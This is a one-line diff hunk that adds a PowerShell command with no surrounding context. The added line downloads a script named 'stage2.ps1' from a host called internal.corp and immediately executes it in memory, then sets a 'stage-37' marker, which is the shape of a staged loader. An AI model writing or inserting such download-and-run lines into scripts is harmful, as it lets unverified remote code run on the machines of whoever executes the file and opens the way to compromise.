@@ -1,0 +1,1 @@
+$DownloadedScript = (iwr 'https://internal.corp:443/stage2.ps1' -UseBasicParsing).Content; [ScriptBlock]::Create($DownloadedScript).Invoke(); $StageMarker = "stage-37"; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
